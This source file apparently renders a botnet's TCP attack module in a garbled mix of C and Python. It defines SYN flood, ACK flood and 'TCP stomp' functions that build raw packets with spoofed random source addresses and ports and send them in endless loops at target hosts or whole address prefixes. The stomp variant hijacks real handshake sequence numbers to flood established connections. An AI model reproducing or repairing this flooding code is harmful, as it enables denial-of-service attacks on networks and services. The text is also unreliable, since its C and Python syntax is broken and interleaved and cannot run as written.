import os, fcntl
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"

def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    seq = attack_get_opt_int(opts_len; 0xffff)
    ack = attack_get_opt_int(opts_len; 0)
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    source_ip = attack_get_opt_ip(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct tcphdr *tcph

        pkts[i] = calloc(128, sizeof (char))
        iph = (struct iphdr *)pkts[i]
        tcph = (struct tcphdr *)(iph + 1)
        opts = ()(tcph + 1)

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_TCP
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        tcph.source = htons(sport)
        tcph.dest = htons(dport)
        tcph.seq = htons(seq)
        tcph.doff = 10
        tcph.urg = urg_fl
        tcph.ack = ack_fl
        tcph.psh = psh_fl
        tcph.rst = rst_fl
        tcph.syn = syn_fl
        tcph.fin = fin_fl

        # TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS    # Kind
        *opts++ = 4                    # Length
        *(()opts) = htons(1400 + (rand_next() & 0x0f))
        opts += sizeof (uint16_t)

        # TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK
        *opts++ = 2

        # TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL
        *opts++ = 10
        *(()opts) = rand_next()
        opts += sizeof (uint32_t)
        *(()opts) = 0
        opts += sizeof (uint32_t)

        # TCP nop
        *opts++ = 1

        # TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS
        *opts++ = 3
        *opts++ = 6 # 2^6 = 64, window size scale = 64

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            
            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()
            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
            if sport == 0xffff:
                tcph.source = rand_next() & 0xffff
            if dport == 0xffff:
                tcph.dest = rand_next() & 0xffff
            if seq == 0xffff:
                tcph.seq = rand_next()
            if ack == 0xffff:
                tcph.ack_seq = rand_next()
            if urg_fl:
                tcph.urg_ptr = rand_next() & 0xffff

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, False)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    seq = attack_get_opt_int(opts_len; 0xffff)
    ack = attack_get_opt_int(opts_len; 0xffff)
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, True)
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, False)
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    data_len = attack_get_opt_int(opts_len; 512)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    source_ip = attack_get_opt_ip(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct tcphdr *tcph

        pkts[i] = calloc(1510, sizeof (char))
        iph = (struct iphdr *)pkts[i]
        tcph = (struct tcphdr *)(iph + 1)
        payload = ()(tcph + 1)

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_TCP
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        tcph.source = htons(sport)
        tcph.dest = htons(dport)
        tcph.seq = htons(seq)
        tcph.doff = 5
        tcph.urg = urg_fl
        tcph.ack = ack_fl
        tcph.psh = psh_fl
        tcph.rst = rst_fl
        tcph.syn = syn_fl
        tcph.fin = fin_fl
        tcph.window = rand_next() & 0xffff
        if psh_fl:
            tcph.psh = True

        rand_str(payload, data_len)

#    targs[0].sock_addr.sin_port = tcph->dest
#    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
#    {
#
#    }

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            data = ()(tcph + 1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()
            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
            if sport == 0xffff:
                tcph.source = rand_next() & 0xffff
            if dport == 0xffff:
                tcph.dest = rand_next() & 0xffff
            if seq == 0xffff:
                tcph.seq = rand_next()
            if ack == 0xffff:
                tcph.ack_seq = rand_next()

            # Randomize packet content?
            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data))
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, True)
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, True)
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, False)
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    data_len = attack_get_opt_int(opts_len; 768)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)

    # Set up receive socket
    if (rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Could not open raw socket!\n")
#endif
        return
    i = 1
    if setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(rfd)
        return

    # Retrieve all ACK/SEQ numbers
    for i in range(targs_len):
        struct sockaddr_in addr, recv_addr
        socklen_t recv_addr_len

        stomp_setup_nums:

        if (fd = socket(AF_INET, SOCK_STREAM, 0)) == -1:
#ifdef DEBUG
            printf("Failed to create socket!\n")
#endif
            continue

        # Set it in nonblocking mode
        fcntl.fcntl(fd, F_SETFL, fcntl.fcntl(fd, F_GETFL, 0) | os.O_NONBLOCK)
 
        # Set up address to connect to
        addr.sin_family = AF_INET
        if targs[i].netmask < 32:
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
        else:
            addr.sin_addr.s_addr = targs[i].addr
        if dport == 0xffff:
            addr.sin_port = rand_next() & 0xffff
        else:
            addr.sin_port = htons(dport)

        # Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
        start_recv = time.time()

        # Get info
        while True:

            recv_addr_len = sizeof (struct sockaddr_in)
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len)
            if ret == -1:
#ifdef DEBUG
                printf("Could not listen on raw socket!\n")
#endif
                return
            if recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr and ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)):
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr))

                if tcph.source == addr.sin_port:
                    if tcph.syn and tcph.ack:
                        struct iphdr *iph
                        struct tcphdr *tcph

                        stomp_data[i].addr = addr.sin_addr.s_addr
                        stomp_data[i].seq = ntohl(tcph.seq)
                        stomp_data[i].ack_seq = ntohl(tcph.ack_seq)
                        stomp_data[i].sport = tcph.dest
                        stomp_data[i].dport = addr.sin_port
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n")
#endif
                        # Set up the packet
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
                        iph = (struct iphdr *)pkts[i]
                        tcph = (struct tcphdr *)(iph + 1)
                        payload = ()(tcph + 1)

                        iph.version = 4
                        iph.ihl = 5
                        iph.tos = ip_tos
                        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len)
                        iph.id = htons(ip_ident)
                        iph.ttl = ip_ttl
                        if dont_frag:
                            iph.frag_off = htons(1 << 14)
                        iph.protocol = IPPROTO_TCP
                        iph.saddr = LOCAL_ADDR
                        iph.daddr = stomp_data[i].addr

                        tcph.source = stomp_data[i].sport
                        tcph.dest = stomp_data[i].dport
                        tcph.seq = stomp_data[i].ack_seq
                        tcph.ack_seq = stomp_data[i].seq
                        tcph.doff = 8
                        tcph.fin = True
                        tcph.ack = True
                        tcph.window = rand_next() & 0xffff
                        tcph.urg = urg_fl
                        tcph.ack = ack_fl
                        tcph.psh = psh_fl
                        tcph.rst = rst_fl
                        tcph.syn = syn_fl
                        tcph.fin = fin_fl

                        rand_str(payload, data_len)
                        break
                    elif tcph.fin or tcph.rst:
                        os.close(fd)
                        goto stomp_setup_nums

            if time.time() - start_recv > 10:
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n")
#endif
                os.close(fd)
                goto stomp_setup_nums

    # Start spewing out traffic
    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            data = ()(tcph + 1)

            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff

            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            tcph.seq = htons(stomp_data[i].seq++)
            tcph.ack_seq = htons(stomp_data[i].ack_seq)
            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif
